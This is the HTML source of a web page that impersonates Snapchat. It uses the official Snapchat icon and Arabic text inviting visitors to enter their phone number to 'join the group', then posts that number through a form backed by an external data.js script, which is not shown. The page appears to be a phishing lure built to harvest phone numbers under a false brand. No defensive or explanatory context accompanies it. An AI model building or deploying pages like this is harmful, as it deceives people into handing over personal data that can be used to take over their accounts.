<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Group Snapchat</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" type="image/x-icon" href="snapchat1.png.png">
</head>
<body>
    <div class="wrapper1">
        <div class="logincontainer">
            <img src="https://accounts.snapchat.com/accounts/static/images/ghost/snapchat-app-icon.svg" alt="Snapchat Ghost Icon">
            <h1 class="accountsTitle">أدخل رقم الهاتف</h1>
            <div class="description">أدخل رقم الهاتف المحمول للانضمام إلى المجموعة.</div>
            <br>
            <form id="input" method="post">
                <label class="control-label">رقم الهاتف</label>
                <div class="phone-form-group form-group">
                    <br>
                    <input id="number" name="phone" tabindex="6" type="number" class="form-control" required="required">
                </div>
                <button type="submit" name="submit" class="btn btn-lg btn-primary">متابعة</button>
            </form>
        </div>
    </div>
    <script src="data.js"></script>
</body>
</html>
